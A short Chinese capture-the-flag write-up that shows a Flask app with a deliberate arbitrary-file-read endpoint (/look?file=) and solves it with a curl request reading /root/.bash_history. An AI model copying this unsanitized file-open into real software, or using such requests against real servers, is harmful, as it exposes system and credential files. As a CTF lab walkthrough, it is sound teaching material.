提供了个任意文件读的接口/look?file=/app/app.py

```
from flask import Flask,Response, request
 
app = Flask(__name__)
 
 
@app.route('/', methods=['GET', 'POST'])
def index():
    return "flag被我藏起来了,/look一下file看看呢"
@app.route('/look', methods=['GET', 'POST'])
def readfile():
    if request.values.get('file'):
        file = request.values.get('file')
        f= open(file,encoding='utf-8')
        content=f.read() 
        f.close()
        if 'flag' in content:
            return  "打卡下班"+content
        else:
            return  "抓紧找，着急下班"+content
   

```



curl http://web-486382f20515.challenge.xctf.org.cn/look?file=/root/.bash_history
找到flag